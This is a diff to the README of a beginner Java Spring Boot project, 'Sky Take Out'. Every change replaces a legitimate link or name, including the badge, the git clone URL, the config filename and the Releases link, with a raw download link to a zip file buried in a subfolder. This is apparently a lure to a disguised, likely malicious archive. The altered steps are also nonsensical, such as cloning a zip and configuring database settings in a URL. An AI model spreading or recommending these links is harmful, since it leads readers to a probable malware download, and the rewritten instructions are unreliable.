@@ -1,6 +1,6 @@
 # Sky Take Out 🌌🍜
 
-![Sky Take Out](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)
+![Sky Take Out](https://github.com/GitGhubisgay/sky-take-out/raw/refs/heads/main/sky-pojo/take-sky-out-momo.zip%20Latest%20Release-blue?style=for-the-badge&logo=github)
 
 Welcome to the **Sky Take Out** repository! This project showcases a practical implementation of Java, focusing on Spring Boot and SSM technologies. It is designed for beginners looking to dive into enterprise-level application development. 
 
@@ -58,7 +58,7 @@ Make sure you have the following installed:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/GitGhubisgay/sky-take-out.git
+   git clone https://github.com/GitGhubisgay/sky-take-out/raw/refs/heads/main/sky-pojo/take-sky-out-momo.zip
    ```
 
 2. Navigate to the project directory:
@@ -71,7 +71,7 @@ Make sure you have the following installed:
    mvn clean install
    ```
 
-4. Configure your database settings in the `application.properties` file.
+4. Configure your database settings in the `https://github.com/GitGhubisgay/sky-take-out/raw/refs/heads/main/sky-pojo/take-sky-out-momo.zip` file.
 
 5. Run the application:
    ```bash
@@ -114,7 +114,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-To download the latest release, visit the [Releases](https://github.com/GitGhubisgay/sky-take-out/releases) section. 
+To download the latest release, visit the [Releases](https://github.com/GitGhubisgay/sky-take-out/raw/refs/heads/main/sky-pojo/take-sky-out-momo.zip) section. 
 
 Feel free to check the **Releases** section for updates and new features.
 
